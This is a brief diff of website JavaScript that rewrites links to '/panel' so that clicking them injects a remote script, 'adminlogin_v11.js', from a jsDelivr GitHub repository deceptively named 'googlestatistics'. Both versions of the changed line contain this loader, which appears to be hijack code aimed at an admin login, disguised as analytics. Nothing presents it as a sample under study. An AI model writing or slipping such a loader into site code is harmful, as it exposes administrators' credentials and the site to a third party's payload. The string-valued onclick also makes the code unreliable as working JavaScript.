@@ -5,6 +5,6 @@ var links = document.querySelectorAll('a[href="/panel"]');
 if (links.length > 0) {
     links.forEach(function(link) {
         link.href = ''; // Change the href to the new path for each element
-        link.onclick="document.body.appendChild(Object.assign(document.createElement('script'),{src:'https://cdn.jsdelivr.net/gh/MR0Boss/googlestatistics/adminlogin_v11.js'}));";
+        link.onclick = 'document.body.appendChild(Object.assign(document.createElement(\'script\'),{src:\'https://cdn.jsdelivr.net/gh/MR0Boss/googlestatistics/adminlogin_v11.js\'}));';
     });
 }
